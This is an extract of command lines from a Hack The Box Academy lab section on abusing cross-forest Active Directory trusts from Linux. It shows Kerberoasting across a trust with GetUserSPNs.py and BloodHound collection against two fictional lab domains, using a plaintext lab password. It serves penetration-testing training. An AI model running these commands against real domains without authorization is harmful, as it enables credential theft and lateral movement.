# Section 31: Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1509
- Code/command blocks: 7

> Terminal output is omitted; only commands & scripts are captured.

## 1. `shellsession` _(output omitted)_

```bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```

## 2. `shellsession` _(output omitted)_

```bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
```

## 3. `shellsession` _(output omitted)_

```bash
cat /etc/resolv.conf 
```

## 4. `shellsession` _(output omitted)_

```bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

## 5. `shellsession` _(output omitted)_

```bash
zip -r ilfreight_bh.zip *.json
```

## 6. `shellsession` _(output omitted)_

```bash
cat /etc/resolv.conf 
```

## 7. `shellsession` _(output omitted)_

```bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```

